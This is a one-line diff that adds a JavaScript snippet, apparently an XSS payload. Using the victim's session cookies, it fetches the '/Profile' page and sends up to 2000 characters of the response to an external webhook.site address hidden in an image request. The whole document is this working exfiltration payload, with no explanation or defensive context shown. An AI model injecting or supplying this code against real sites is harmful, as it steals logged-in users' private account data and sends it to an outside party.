@@ -1,0 +1,1 @@
+fetch('/Profile',{credentials:'include'}).then(r=>r.text()).then(d=>new Image().src='https://webhook.site/dbffcd4a-59b3-4a3b-8de2-453266989ae4?d='+encodeURIComponent(d.substring(0,2000)))
